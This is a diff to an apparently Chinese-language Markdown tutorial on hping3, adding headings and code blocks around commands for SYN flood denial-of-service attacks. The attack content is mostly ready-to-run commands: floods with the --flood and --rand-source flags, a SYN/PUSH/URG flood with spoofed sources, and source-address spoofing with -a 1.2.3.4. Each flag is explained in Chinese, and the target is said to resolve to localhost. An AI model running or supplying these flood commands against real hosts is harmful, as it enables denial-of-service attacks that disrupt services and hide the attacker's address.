@@ -204,8 +204,9 @@ yum install -y hping3
 
 ## example
 
-```
 
+### FTP(21 port)
+```
 hping3  -c 100000 -d 120 -S -w 64 -p 21 --flood --rand-source www.hping3testsite.com
 
 1. hping3 = 應用程式二進位代碼的名稱。
@@ -218,12 +219,14 @@ hping3  -c 100000 -d 120 -S -w 64 -p 21 --flood --rand-source www.hping3testsite
 8. --rand-source = 使用隨機性的源頭IP位址。你還可以使用-a或–spoof來隱藏主機名。詳見文章末尾的參考手冊頁。
 9. www.hping3testsite.com = 目的地IP位址或目標機器的IP位址。你在這裡還可以使用網站名稱。在本文中解析至127.0.0.1(已在/etc/hosts文件中輸入)。
 那麼，你如何知道它切實可行呢?在hping3洪水攻擊模式下，我們並不檢查收到的回覆(實際上你也無法檢查收到的回覆，因為我們在這個命令中使用了–rand-souce標誌，這意味著源頭IP位址不再是你的IP位址。)
+```
+## 結合偽造IP位址的簡單的SYN洪水攻擊――使用HPING3的DoS
 
+```
+hping3 -S -P -U --flood -V --rand-source www.hping3testsite.com
+```
 
-
-
-
-
+```
 hping3  192.168.0.21 –i u10000  –S  –a 1.2.3.4
 hping3 want_ping_ip --fast -p 80 -S  --rand-source
 hping want_ping_ip –i u100000 –S –a 1.2.3.4 
